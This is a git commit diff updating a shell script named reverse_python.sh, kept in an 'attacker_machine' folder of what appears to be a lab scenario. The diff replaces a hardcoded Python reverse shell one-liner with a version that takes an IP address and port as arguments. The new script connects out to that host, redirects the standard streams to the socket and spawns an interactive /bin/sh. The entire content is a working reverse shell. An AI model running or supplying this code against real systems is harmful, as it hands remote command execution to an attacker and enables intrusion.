37f7a0c385dad0cbd3237dc1be8bc6e983249c84
C4denaX <48528606+C4denaX@users.noreply.github.com>
2024-09-17 11:23:39 +0200

    Update reverse_python.sh

--- attacker_machine/escenario_scripts/reverse_python.sh
+++ attacker_machine/escenario_scripts/reverse_python.sh
@@ -1,3 +1,18 @@
 #!/bin/bash
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.19.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# Check if the correct number of arguments is provided
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 <IP_ADDRESS> <PORT>"
+    exit 1
+fi
+
+IP_ADDRESS=$1
+PORT=$2
+
+python -c "import socket, subprocess, os; \
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); \
+s.connect(('$IP_ADDRESS', $PORT)); \
+os.dup2(s.fileno(), 0); \
+os.dup2(s.fileno(), 1); \
+os.dup2(s.fileno(), 2); \
+subprocess.call(['/bin/sh', '-i'])"
